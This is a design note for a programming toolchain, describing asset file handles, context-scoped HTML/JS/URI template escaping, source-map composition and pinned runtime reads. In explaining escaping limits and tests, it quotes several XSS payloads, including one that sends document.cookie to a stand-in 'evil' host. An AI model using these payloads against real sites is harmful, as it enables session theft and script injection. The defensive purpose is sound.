# 459 - external asset references and context-scoped templates

**Roadmap:** item 459 (issue #722), part of the 462 web-platform arc ·
**Builds on:** docs/design/526-webui-asset-alignment.md,
docs/design/530-webui-entry-surface.md,
docs/design/525-webapp-slice4-frontend.md ·
**Status:** STAGE 1 LANDED (templates + context-scoped escaping) · WEBUI ASSET MODEL + TYPED CHANNEL LANDED (F5, F7) · TYPED ASSET HANDLES LANDED (F1) · SOURCE MAPS LANDED (F2, insertion site + bundler chain) · RUNTIME ASSET READ LANDED (F6) · REMAINDER NAMED BELOW

## Purpose

Item 459 (`docs/v2.0-roadmap.md:5171`) asks for first-class frontend asset
integration: a revl source names external asset files instead of carrying their
bytes in a string literal, reusable templates escape each insertion for the
context it lands in, output maps back to the original asset, and normal JS/TS
tooling stays in play behind a clean typed boundary.

The issue text is **partly stale**. Three pieces of item 459 have already landed
on main, each with its own guard suite:

| landed | what it pins | guard |
| --- | --- | --- |
| `stdlib/escape.rvl` | the three context escapers as a named surface: `escape_html`, `escape_js`, `escape_uri` | `tests/test_escape_stdlib.py` |
| `examples/webui-entry/console.rvl` | the frontend is contributed as external asset PATHS through a typed `requires webui: WebUI` coeffect, with zero inline HTML/CSS/JS in the artifact | `tests/test_webui_entry_asset_ref_459.py` |
| `examples/app/frontend/` | a real Vite/Vue frontend next to a revl service, with a source map | `tests/test_app_frontend_725.py` |

So "no JS extracted from revl strings" and "the frontend is a real TS project"
are already the shipped shape, and `docs/design/526` already argues revl must
bind to Cordis WebUI rather than grow a console framework. What is genuinely
missing is the **consumer** of the escapers and the resolution of an asset
**path** into an asset **file**.

## The gap (measured, not assumed)

1. **Nothing resolves an asset path to a file at build time.** In
   `examples/webui-entry/console.rvl:46-60` the entry's `dev_source` and
   `prod_manifest` are bare `Str` parameters. They name files; the toolchain
   never opens them, never hashes them, and never fails when they are absent or
   outside the tree. The compiler-side precedent for doing this properly already
   exists and is unused here: `src/revl/hostref.py` (design note
   `docs/design/396-host-code-file-reference.md`, option B) resolves a declared
   path relative to the declaring `.rvl`, jails it to the root tree, and pins
   its content by sha256. That machinery is for host CODE files, not for CSS/JS/
   template ASSETS, and nothing in the asset lane reaches it.
2. **No template machinery exists at all.** There is no `{{ ... }}` scanner, no
   insertion-site model and no caller-facing template API anywhere in
   `stdlib/`, `src/revl/` or `examples/`. `stdlib/escape.rvl` names the escapers
   but leaves the choice of WHICH escaper applies at each site to a human
   reading the markup, which is precisely the decision that has to be made once,
   at the site, and then be non-optional.
3. **No typed handle for an asset or a template value.** With only `Str` in the
   boundary, a path that was never resolved and a path that was resolved look
   identical, and a value that was escaped and one that was not look identical.

## Stage 1 (this change): context-scoped templates

`stdlib/template.rvl` closes gap 2 and the template half of gap 3, with the
escaping being the security-relevant part.

A template writes the context of every insertion site next to the site. A
template is an ordinary `Str`, so one function returning three of them is a
whole program:

```revl
fn page_templates() -> List[Str] {
  return [
    '<h1>{{html:title}}</h1>',
    '<script>boot("{{script:token}}");</script>',
    '<a href="/n/{{uri:slug}}">open</a>',
  ]
}
```

`scan` turns a template into `Hole` records, `escape_for` is the context to
escaper table, and `render` binds a `List[Binding]` to the holes and escapes
each value for its own hole's context. The properties that make it worth
landing:

- **The escaping rule is chosen by the insertion context.** `html` uses the
  entity encoder, `script` the JS string-literal encoder that closes the
  `</script>` element breakout, `uri` the RFC-3986 component encoder. The same
  bytes render differently in different contexts, and a test pins exactly that.
- **Wrongly-contextual insertion is refused or neutralised.** An unknown context
  is an `Err`, never a silent fall-through to some default escaper. A hole name
  must be a bare identifier, so `{{&x}}`, `{{{x}}}`, `{{x|raw}}` and `{{ x }}`
  are all refused: there is no raw/no-escape insertion form to forget to avoid.
- **The call is not ambiguous about what it inserts.** A hole with no bound
  value is an `Err` (no empty default), and a name bound twice is an `Err` (no
  scan-order tiebreak), so "which value landed here" is always answerable.
- **Origin groundwork.** Each `Hole` carries `start`/`end`, the **codepoint**
  offsets of the whole hole in the template, so `tpl.slice(start, end)` is the
  hole exactly on every tier (a byte slice would mis-slice every non-ASCII
  template). That is what a later stage needs to map generated
  output back to an insertion site in the original file.
- **Pure revl, every tier.** The module is built on the base `Str`/`Int` surface
  plus the three escapers, introduces no externs, and so lowers on every backend
  the day it lands, `wasm` included.

### The context table

| context | site | escaper | what it stops |
| --- | --- | --- | --- |
| `html` | element text, or a quoted attribute value | `escape_html` | tag and attribute breakout (`& < > " '`) |
| `script` | inside a **double-quoted** `<script>` JS string literal | `escape_js` | `</script>` and `<!--` element breakout, double-quote and line-terminator breakout |
| `uri` | a URL component (`href`, `src`, a query value) | `escape_uri` | component breakout (`/`, `?`, `&`, `#`, `%`, space, and multi-byte bytes) |

`html` and a quoted attribute deliberately share one escaper: the five characters
`escape_html` encodes are the same five that matter in both, so a second rule
would be a second thing to get wrong. The context that proves the rule is chosen
per site is `uri`, where the required encoding is genuinely different, and that
is what the tests pin. An unquoted attribute is not a supported context: it has
no encoding that does not need the quotes, so the template must quote it (which
is a property of the template, and is checked by nothing here; the template
author writes `attr="{{html:x}}"`).

## Design decisions and rejected alternatives

- **A new module rather than extending `stdlib/escape.rvl`.** The escapers are a
  reusable primitive with their own guard suite; the template engine is a
  consumer with its own failure modes (malformed holes, unbound names,
  duplicate names). Mixing them would make every future escaper change a
  template change. Adding a public stdlib module bumps the version stamp
  (`stdlib/version.rvl`, roadmap item 389), which is done in this change.
- **Declared context, not inferred context.** A template says which context a
  hole is in; the module does not try to find where an attribute or a script
  element ends. Inferring context means parsing HTML, and an HTML parser that is
  wrong about where a tag ends is an escaping bug, not a rendering bug. The
  limit this leaves is explicit and pinned by a test: a hole whose declared
  context is a *known* context but not the site's real one is not detected,
  because detecting it is the HTML parse this module refuses to do. What the
  module guarantees is the other half of the property: escaping is never
  optional, and a context outside the closed set is refused rather than
  defaulted. Concretely, the `script` row above is scoped to a **double-quoted**
  JS string literal, because `escape_js` deliberately leaves the single quote
  alone (`stdlib/escape.rvl:121-122`). Declaring `script` *correctly* at a
  **single-quoted** JS literal site therefore still breaks out of it:

  ```revl
  render_one("<script>const cfg = '{{script:v}}';</script>", "v",
             "';fetch('//evil/'+document.cookie)//")
  // -> <script>const cfg = '';fetch('//evil/'+document.cookie)//';</script>
  ```

  That is live JS injection, not a rendering artifact: the payload closes the
  literal and runs. Closing it needs a JS-string escaper parameterised by the
  quoting character, which this stage does not have; until it does, a
  `{{script:...}}` hole must land in a double-quoted literal.
- **`Result` for every failure, no `fail`.** A malformed template and an unbound
  hole are ordinary outcomes of rendering data that the program did not author,
  so they travel as values. `Err.code` is a stable token (`malformed-hole`,
  `unknown-context`, `unknown-binding`, `duplicate-binding`) a caller can branch
  on.
- **Escape values, not templates.** The template text passes through unchanged;
  only inserted values are escaped. An escaped template is a template whose
  markup has been corrupted.
- **Rejected: build the loader here too.** A disk-backed `asset.rvl` (resolve,
  jail, hash, read) is the other half of item 459 and needs the file-reference
  machinery plus a per-tier host body. Landing it inside the template change
  would make the security-relevant escaping untestable in isolation and would
  tie a pure module to the tiers that have a filesystem. It is stage 2 below.

## Deliberately deferred (named so the remainder is not mistaken for done)

- **F1 - disk-backed asset references. LANDED.** `asset "<path>"` resolves an
  asset file at compile time against the root-tree jail and pins the sha256 of
  its bytes, reusing `src/revl/hostref.py`'s resolution and containment rule
  rather than inventing a second one. The value is the record
  `{ path: Str, sha256: Str }` with `path` root-relative, so it lowers, types
  and emits on every tier with no new backend case, and a bare `Str` no longer
  type-checks where an asset is expected. `dev_source` in
  `examples/webui-entry/console.rvl` and `examples/app/notes.rvl` is now that
  handle, and the WebUI adapter `revl dev` installs re-hashes the file under the
  app root, refusing a digest mismatch (the deploy-time half, mirroring
  `hostref.plug_refs`).

  What it does NOT claim. `prod_manifest` is still a `Str`: a Vite manifest is a
  build OUTPUT that does not exist when the composition is compiled, so there is
  nothing on disk to resolve or pin, and pinning it needs a build-time step the
  toolchain does not have. The handle's record shape has no canonical stdlib
  name, so each composition declares the type; writing the record by hand
  type-checks, which is why it is a shape rather than a capability. And an
  `asset` is refused under the untrusted-author profile (`no_extern`), so an
  admitted turn cannot use it to probe the compile tree. Guard:
  `tests/test_asset_handle_459.py`, with the dev-host half in
  `tests/test_app_notes_725.py`.
- **F2 - real source maps. THE INSERTION-SITE HALF LANDED.**
  `stdlib/template.rvl` now consumes the `Hole.start`/`Hole.end` groundwork:
  `render_mapped` returns the rendered text plus a `Segment` per span of output
  saying which template position it came from, as a 0-based `Pos`, and
  `source_map` writes that as a Source Map v3 document with the template inlined
  as `sourcesContent`. `position_at` is the offset-to-line/column half on its
  own and refuses an out-of-range offset rather than clamping. `render` is
  `render_mapped` with the map dropped, so the mapped and unmapped doors cannot
  answer different text for one template.

  Three decisions worth naming. A span that crosses a generated line break is
  recorded once PER GENERATED LINE, because a source map addresses a line and a
  column and cannot describe a span that spills past the end of one; every
  generated line with any character therefore carries a segment at column 0. An
  inserted VALUE maps in full to the hole that produced it, because a line break
  inside data has no position in the template. And the JSON strings reuse
  `escape_js`, whose output is already a valid JSON string body and whose three
  extra escapes (`<`, `>`, `&`) are what stop an inlined template breaking out
  of a `<script>` element carrying the map: a second escaper here would be a
  second thing to get wrong, the same argument F1 makes about a second jail.

  THE BUNDLER CHAIN LANDED TOO. `src/revl/sourcemap.py` composes the template's
  map with the bundler's, and `revl sourcemap compose` is the door, so a browser
  stack trace in a bundle built from rendered text walks back to the template
  rather than stopping at the generated file.

  Four decisions worth naming, because each of them is a place where a composer
  can be wrong quietly. The composition is DEFINED as the walk a consumer would
  do by hand (`compose(outer, inner) . resolve == inner . resolve . outer .
  resolve`, no interpolation, since the format licenses none), which is what the
  suite drives position by position rather than asserting a sample. A mapping
  into the generated file that the inner map does not cover is BLANKED to a
  1-field mapping rather than kept (which would point at a file the composed map
  no longer lists) or deleted (which would let the previous mapping on the line
  spill forward over a region nothing knows anything about). A NAME is taken
  from the inner mapping when it has one, because that is the name that names
  something in the file the composed map opens. And the composer never OPENS a
  path a map names: `sources`, `sourceRoot`, `file` and `sourceMappingURL` are
  attacker-shaped strings arriving from a build artifact, so filling a missing
  `sourcesContent` from disk would be a file-read primitive reachable from one.
  That is not a jail, it is the absence of anything to jail, which is the
  stronger form of the same argument F1 makes about not writing a second jail.

  It is a TOOLCHAIN step and not a stdlib one, and that is a fact about the
  pipeline rather than a preference: the inner map is produced by a revl program
  at render time and the outer one by the bundler afterwards, so no process sees
  both. The stdlib half stays pure revl, so F6 reaches neither half.

  What it does NOT claim: resolution finer than the inner map carries.
  `render_mapped` records one segment per generated line of copied text plus one
  per inserted value, so a bundled position inside copied text composes to the
  start of its template line. Line provenance, which is what a stack trace asks
  for, is exact. An index map (`sections`) is refused rather than composed
  per-section.

  Guards: `tests/test_template_source_map_459.py` for the insertion-site half,
  whose map checks are decoded by an independent VLQ reader and whose
  thirteen-mutation neutering proof makes the gate's ability to fail a measured
  fact rather than a claim; `tests/test_sourcemap_chain_459.py` for the chain,
  with nineteen mutations, an independently written resolver, inner maps
  produced by the shipped `stdlib/template.rvl` rather than by fixtures built to
  agree, and one leg that runs a real `vite build` over a template-rendered
  `.ts` and resolves a position in the resulting BUNDLE back to the `.tpl` line
  and hole name that produced it.
- **F3 - template control flow. STILL DEFERRED, on a stated precondition.**
  `{{if}}`, `{{for}}`, includes, layout inheritance, blocks and a per-directory
  default context. Every hole is explicit and flat in stage 1, and that is the
  property the feature costs, so the deferral is argued here rather than left as
  a line item somebody picks up as a syntax exercise.

  Stage 1's safety property is that escaping is never optional. Three separate
  mechanisms carry it, and F3's four pieces take one away each:

  1. **The slot grammar is exactly `{{context:name}}`.** That is WHY `{{&x}}`,
     `{{{x}}}`, `{{x|raw}}` and `{{ x }}` are refused: they are refused as a
     SHAPE, not as a blacklist of the raw forms somebody thought of. A `{{if}}`
     needs a condition, and a condition is an expression. Widening the slot to
     hold a directive turns every one of those refusals into a blacklist, and
     "an expression, a filter or a directive cannot be smuggled through the
     slot" stops being a property of the grammar.
  2. **Bindings are one flat list, and both `unknown-binding` and
     `duplicate-binding` are answerable by reading it.** `{{for}}` replaces that
     with a scoped environment. "Which value landed here" then stops being a
     question about the call and becomes a question about a frame, and the two
     refusals become scope-relative.
  3. **A context outside the closed set is an `Err`, never a fall-through to
     some default escaper.** A per-directory DEFAULT context is the direct
     negation of that sentence. The two cannot both hold.

  The fourth piece, **includes and layouts, is the real blocker**, and it is the
  autoescaping-inheritance question this note deferred at stage 1. An included
  template declares the context of its own holes; the site that includes it
  decides which context those holes actually land in. `{{html:x}}` in a partial
  is correct inside a `<p>` and is a live breakout inside a `<script>` in the
  layout that included it. There are three ways to settle that and stage 1 has
  already ruled out two:

  - **infer the context at the include site** by parsing the surrounding markup.
    Refused, for the reason stage 1 gives above: an HTML parser that is wrong
    about where a tag ends is an escaping bug, not a rendering bug.
  - **re-escape the included output** for the site's context. Escaping an
    already-escaped document corrupts it (`&amp;` becomes `&amp;amp;`), and
    "escape values, not templates" is a stage-1 decision for exactly that
    reason.
  - **declare the context at the include site and CHECK it** against the
    contexts the include declares, refusing a mismatch. This is the only sound
    option, and it is a context ALGEBRA rather than a syntax addition: a
    template needs a declared context signature, the check is per hole, and a
    partial reused at two different contexts is either two partials or a
    parameterised one.

  So F3 is not one feature. It is a syntax change gated on a design that does
  not exist: what a template's declared context signature is, what an include
  site declares, and what a mismatch does. Shipping `{{if}}`/`{{for}}` alone
  would deliver the syntax people reach for and leave the escaping question open
  at precisely the site that reopens it, which is how an autoescaping engine
  ends up with a `|raw` filter. The stage-1 `script` residual already shows the
  cost of an escaper whose site is not visible at the hole, at ONE site;
  control flow multiplies those sites.

  What would lift the deferral is that separate note, not a slice of this one.
- **F4 - the exemplary app.** Issue #725 (blocked on #724) and the slice-4
  frontend gap G3 (`docs/design/525-webapp-slice4-frontend.md`). Item 459's
  stated exit is app-gated on 462 and cannot close before it.
- **F5 - the typed reactive-state/RPC contract. LANDED.** Decision B of
  `docs/design/530-webui-entry-surface.md`, folded into item 457 and shipped as
  457 slice S4: `add_entry` takes a `data` parameter whose type is a declared
  record (the reactive state), the RPC surface is the component's declared
  provisions, and `revl export client --lang ts --face webui --component NAME`
  projects both into the TypeScript the browser reads with `useRpc<T>()`.
- **F6 - tiers. LANDED.** The restatement this note gave F6 was precise about
  what it does NOT reach: `stdlib/template.rvl` (holes, escaping,
  `render_mapped`, `source_map`) is pure revl and runs on every tier, F1's
  `asset` resolution happens in the COMPILER rather than in emitted code, and
  F2's bundler chain is a toolchain step that emits nothing. What was left was
  the one piece that genuinely needs a per-tier HOST BODY: reading a template
  from disk at RUN time. `stdlib/asset.rvl` is that door.

  `load(handle: AssetRef) -> Result[Str, FsError]` takes the F1 handle and
  answers the file's text; `locate(handle)` answers the confinement decision
  alone. `AssetRef` is also the canonical stdlib name for the handle's record
  shape, which F1 explicitly left open.

  Four decisions worth naming, because each is a place where a runtime read can
  be wrong quietly.

  **The pin is ENFORCED by the read, not dropped by it.** This is the question
  the brief for this slice raised, and it does not need a new design: a runtime
  read of a file the compiler already hashed is the obvious place to LOSE the
  pin, so `load` hands the handle's `sha256` to the host body and the text comes
  back only when the file's bytes still hash to it. An edited file is
  `Err(EDIGEST)` and yields nothing, not the bytes, not their length, not a
  prefix. The handle therefore keeps meaning at run time exactly what it meant
  at compile time, and the runtime read is where that claim is CHECKED. The cost
  is stated rather than hidden: this is not hot reload, and it cannot become hot
  reload without the pin ceasing to pin anything.

  **No second jail, because there is nothing to jail twice.** A path resolved at
  run time is a file read, so the confinement decision is `stdlib/fs.rvl`'s
  `resolve_within` - the same family-1 guard every witnessed mutation and every
  inverse passes, realpath BEFORE the membership check, reached through the same
  entry point - and the read is a listed READ HELPER in the same guard module,
  `read_pinned_confined`, which re-establishes containment on the root-anchored
  `O_NOFOLLOW` directory walk rather than re-traversing the name. The refusal
  vocabulary is `FsError`, imported rather than restated. That is the same
  argument F1 makes about reusing option B's jail, applied at the other end of
  the pipeline, and it has a consequence worth stating: the run-time root is the
  SESSION WORKSPACE ROOT, so a deployment that wants a component to read its own
  assets points `REVL_FS_WORKSPACE` at the tree they ship in. An unconfigured
  root is `Err(EWORKSPACE)`, never a fall-through to the working directory.

  `stdlib/fs.rvl` already documents the shape a consumer was expected to use for
  this: `resolve_within`, then read the confined path with your own `os` /
  `node:fs`. `load` grants strictly LESS than that - the same guard decides the
  path, and the digest must additionally match - which is why it is a narrowing
  of an existing door rather than a new primitive on that surface. The raw
  `load_pinned(path, sha256)` extern is PRIVATE for the same reason: the only
  digests that should reach the guard are ones `resolve_assets` computed.

  **A tier that cannot do it REFUSES BY NAME.** `rs`, `go`, `java` and `wasm`
  carry no filesystem bodies anywhere in the stdlib, so a composition calling
  `load` and targeting one of them is refused at COMPILE time, naming the extern
  and the tiers that do have a body. Three of those four already said so; wasm
  answered "callee 'load_pinned' is not a lowerable function", which is the
  sentence it also gives for a misspelled name, so a portability limit and a
  typo were indistinguishable. The wasm emitter now says what the other five
  say. Emitting something that returned an empty template would have been the
  alternative, and it would make a missing tier look like an empty page.

  **What it does NOT claim.** Not a filesystem on the other four tiers:
  `stdlib/fs.rvl` and `stdlib/shell.rvl` remain py plus ts (Slice 2b), so a
  composition that must read at run time AND must target rust is waiting on
  those bodies, not on this item. Not hot reload, above. And not a widened fs
  surface: no unpinned read is exposed on either tier.

  Guards: `tests/test_asset_runtime_load_459.py` covers the door, the pin, every
  confinement arm driven rather than described, the per-tier refusals and a
  py/ts corpus diffed case for case through the REAL emitted py guard and the
  REAL ts entry point. Its twenty-one mutation table rebuilds the shipped guard
  module with one defect at a time against twelve runnable checks, with a
  baseline asserting the shipped module fails none, so the gate's ability to
  fail is measured rather than claimed; every check is triggered by at least one
  mutant and eighteen of the twenty-one are caught by exactly one check.
  `backends/typescript/tests/asset_pinned_read_459.test.ts` is the ts peer, and
  the existing family scans on both tiers cover the new read helper because
  listing it is a deliberate edit to `READ_HELPERS`. Two controls exercise only
  pre-existing surface and hold on both sides of the change.
- **F7 - a `--face webui` CLI verb. LANDED.** `revl export client --lang ts
  --face webui --component NAME` renders a component's channel contract. It emits
  no ASSET: the entry is still contributed through the coeffect, and the verb
  projects the typed channel the assets consume.

## What stage 1 does not claim

Stage 1 does not read a template from disk, does not emit a source map, and does
not add a typed asset handle at the toolchain boundary. It makes the
insertion-site model and its per-context escaping rule a landed, tested,
app-neutral primitive, which is the thing F1, F2 and F4 consume. The webui asset
model and the typed channel (F5, F7) are a separate landed slice on top of it;
what they still do not claim is F1's typed handles and F2's insertion-site map.

## Stage 2 (F1): the asset handle

`asset "<path>"` closes gap 1 and the asset half of gap 3. It is deliberately
NOT a new type in the type system and NOT a new backend case: the parser builds
an `ExprAsset` that IS an `ExprRecord` (a subclass), and the resolver fills it
with two string literals, so everything downstream sees an ordinary record.

The design decisions worth naming:

- **Reuse the option B jail, do not write a second one.** `resolve_assets` lives
  in `src/revl/hostref.py` next to `resolve_refs` and shares `_pick_root` and
  `_contained` with it. A path-confinement bug in a compiler that reads files is
  a file-read primitive, and two jails would drift.
- **The value is the RESOLVED path, not the written one.** `./a/../a/x.ts` and
  `./a/x.ts` produce one handle, and the path a host receives is relative to the
  root compile tree, so the host joins it to the app root. A host that joined
  the written path to its own root would be resolving a second time, under a
  different rule.
- **A path literal, never an expression.** `asset` takes a string literal; a
  `${...}` template is refused at parse. Resolution, jailing and hashing happen
  at compile time, so a path that depends on a runtime value cannot be an asset
  by construction, and admitting one would have made the pin optional.
- **Fail closed on the way to lowering.** An `ExprAsset` that never went through
  the resolver would otherwise lower as the empty record its parser default
  carries: a handle with no path and no digest, silently. Both lowering entry
  points refuse it instead.
- **An in-memory compile reads nothing from disk.** The virtual arm resolves
  through the `sources` map only, exactly as option B's does. The alternative,
  falling back to disk, would turn every in-memory compile of foreign source
  into a file-existence and file-digest oracle over the host.
- **`asset` is an identifier, not a keyword.** It is intercepted only when a
  string literal is juxtaposed after it, so the lexer is untouched and a value
  named `asset` still reads as a variable. That also keeps it out of the gate
  crate's digest inputs.

Not done by F1: `prod_manifest` (a build output, above) and any consumption of
the handle beyond the WebUI coeffect. F3 is unchanged; F2's insertion-site half
and F6's runtime read landed separately, below, and F6 is what gave the handle's
record shape its canonical stdlib name (`AssetRef`).

## Verification

`tests/test_asset_handle_459.py` covers F1: what the handle is (the resolved
root-relative path and the real digest, recomputed from disk, with the digest
following an edit to the file), every refusal above driven rather than
described (absolute, missing, directory, `..` escape, symlink escape, empty,
computed path, in-memory without sources, bare source string, untrusted author),
and the typed half in both directions. Two control cases hold before and after
the change, so a green run is not explained by the harness compiling nothing.

`tests/test_sourcemap_chain_459.py` covers F2's bundler chain. Its corpus INNER
maps are produced by the shipped `stdlib/template.rvl` compiled and executed on
the py tier, not by fixtures written to agree with the composer; its VLQ reader,
mapping decoder and resolver are written from the Source Map v3 field layout and
share no code with `src/revl/sourcemap.py`; and the central check sweeps every
generated position of every case and asserts the composed map answers exactly
what the two-step walk answers. The confinement half makes every filesystem door
raise for the duration of a `compose` call, and one of the nineteen mutations is
a composer that fills a missing `sourcesContent` from disk, so that check is
known to be able to fail rather than asserted to be. The end-to-end leg renders a
template into a `.ts`, runs a real `vite build`, composes, and resolves a
position in the bundle back to the `.tpl` line and hole name; it is gated on the
frontend toolchain exactly like the other `frontend-assets` legs, and that job
runs it with `REVL_REQUIRE_FRONTEND_TOOLCHAIN=1` so the skip cannot read as a
pass. Two controls exercise only pre-existing surface and hold on both sides of
the change.

`tests/test_template_stdlib.py` compiles a consumer that reaches the module
through `use`, pins the public surface and the absence of externs, runs the
emitted Python and calls the module directly, and pins the refusals (raw forms,
malformed holes, unknown contexts, unbound and duplicated names) next to a
neutering proof that shows the naively spliced and the wrongly-contextual
outputs are exploitable while the shipped path is not. In the real output, for
the payload `</script><img src=x onerror=alert(1)><!--` the shipped module emits
`\u003C/script\u003E\u003Cimg src=x onerror=alert(1)\u003E\u003C!--`, while the
same call against a module whose escaper table returns its argument unchanged
emits the payload verbatim (an element breakout), and the same escaper at a
single-quoted attribute site emits `' onmouseover=alert(1) x='` verbatim (an
attribute injection).

The proof is committed, not described:
`test_every_neutering_is_caught_by_the_committed_checks` is parametrised over
sixteen source mutations (the escaper table returning its argument, the context
gates removed, each escaper replaced by each other escaper), rewrites
`stdlib/template.rvl` and `stdlib/escape.rvl` into `tmp_path` and recompiles
from there — so a mutation reaches the layer the checks execute — and fails if
the security checks do not notice. `test_the_proof_has_a_baseline_the_shipped_module_passes_every_check`
is the other half: with no mutation every check holds, so "the checks failed" is
only meaningful evidence against a green baseline. The wrongly-contextual half
is pinned directly by `test_the_context_choice_is_load_bearing` (using `script`
at an attribute site is a breakout) and by
`test_a_wrong_declaration_is_an_author_error_the_module_documents_not_catches`
(the declaration is intent; the module does not check it against the markup).
